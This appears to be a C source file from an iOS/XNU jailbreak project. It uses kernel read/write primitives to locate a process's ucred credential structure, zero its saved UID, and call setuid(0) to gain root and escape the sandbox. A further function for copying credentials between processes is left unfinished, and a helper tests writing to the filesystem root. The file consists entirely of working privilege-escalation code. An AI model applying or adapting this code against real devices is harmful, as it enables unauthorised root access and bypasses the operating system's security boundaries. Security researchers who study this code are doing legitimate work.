#include "../include/tools.h"
#include "../include/kernel.h"

//  a bit memory inefficient but I prefer this as it's more readable
addr64_t read_pointer(krw_handlers *toolbox, addr64_t ptr_addr)
{
    addr64_t ptr;
    return toolbox->kread(ptr_addr, &ptr, sizeof(addr64_t)) ? 0 : STRIP_PAC(ptr);
}

int safe_elevate(krw_handlers *toolbox, pid_t pid)
{
    addr64_t ucred_s = read_pointer(toolbox, find_pid(toolbox, pid) + __ucredOffset);

    if (!ucred_s)
    {
        printf("Failed to read my ucred struct\n");
        return 1;
    }

    uint32_t root = 0;

    if (toolbox->kwrite(&root, ucred_s + __cr_svuid, sizeof(uint32_t)))
    {
        printf("Ucred writing failed!");
        return 1;
    }

    // yes, setuid(0) need to be called twice - from taurine
    if (setuid(0) || setuid(0) || setgid(0) || getuid()) // apparently this just works after nulling __cs_svuid??
    {
        printf("Elevation failed :( UID: %d ", getuid());
        return 1;
    }

    printf("I'm freeee - UID: %d ", getuid());
    return 0; // apparently getting root is enough to break out of sandbox?
}

int copy_ucred(krw_handlers *toolbox, pid_t from, pid_t to)
{
    addr64_t from_ucred = read_pointer(toolbox, find_pid(toolbox, from) + __ucredOffset);
    addr64_t to_ucred = read_pointer(toolbox, find_pid(toolbox, to) + __ucredOffset);

    if (!from_ucred || !to_ucred)
    {
        printf("Failed to find from/to ucreds\n");
        return 1;
    }

    struct ucred key = {0};
    if (toolbox->kread(from_ucred + __cr_uid, &key.cr_posix, sizeof(struct posix_cred)))
    {
        printf("Failed to read posix_cred\n");
        return 0;
    }

    if (toolbox->kread(from_ucred + __cr_audit, &key.cr_audit, sizeof(struct au_session)))
    {
        printf("Failed to read au_session\n");
        return 0;
    }
    key.cr_posix.cr_ngroups = 3;

    /*
         todo: https://twitter.com/xina520/status/1515720109255393282
        https://github.com/apple/darwin-xnu/blob/main/bsd/sys/ucred.h#L89
        */
}

int testRW()
{
    const char *name = "/test.txt";
    FILE *fptr = fopen(name, "w+");

    char string[] = "hello world!";
    char *buffer = malloc(sizeof(string));

    int status = 1;

    if (!fptr || !fwrite(string, sizeof(char), sizeof(string), fptr))
        printf("Failed to write to root! :(\n");
    else
    {
        fflush(fptr);
        fseek(fptr, 0, SEEK_SET);

        if (!fread(buffer, sizeof(char), sizeof(string), fptr))
            printf("failed to read file from root! :( \n");
        else if (strcmp(string, buffer))
            printf("Partial r/w?? wrote: %s but read %s\n", string, buffer);
        else
        {
            status = 0;
            printf("R/W works!");
        }

        if (fclose(fptr) || remove(name))
        {
            printf("Error closing/removing file...");
            fclose(fptr);
        }
    }

    return status;
}